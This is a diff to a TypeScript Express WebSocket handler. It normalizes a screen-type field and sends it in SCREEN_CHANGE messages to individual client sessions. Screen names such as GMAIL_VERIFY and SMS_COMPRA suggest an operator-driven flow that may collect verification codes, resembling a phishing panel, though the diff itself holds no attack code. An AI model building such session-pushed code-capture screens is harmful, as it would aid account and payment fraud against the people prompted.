@@ -1189,18 +1189,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
               console.log('✅ [WebSocket] Datos validados para GMAIL_VERIFY:', JSON.stringify(validatedData));
             }
 
+            // Normalize the tipo by removing "mostrar_" prefix if present
+            let normalizedTipo = tipo.replace('mostrar_', '');
+            
             // Find the target client
             const client = clients.get(sessionId);
             if (client && client.readyState === WebSocket.OPEN) {
-              // Send the screen change command to the client
+              // Send the screen change command to the client with normalized tipo
+              const clientData = { ...validatedData, tipo: normalizedTipo };
               client.send(JSON.stringify({
                 type: 'SCREEN_CHANGE',
-                data: validatedData
+                data: clientData
               }));
 
               // Update session in storage with the new screen state
-              // Remove "mostrar_" prefix from tipo if present
-              let screenType = tipo.replace('mostrar_', '');
+              let screenType = normalizedTipo;
 
               // Normalizar screenType para SMS_COMPRA
               if (screenType.toLowerCase() === 'sms_compra' || 
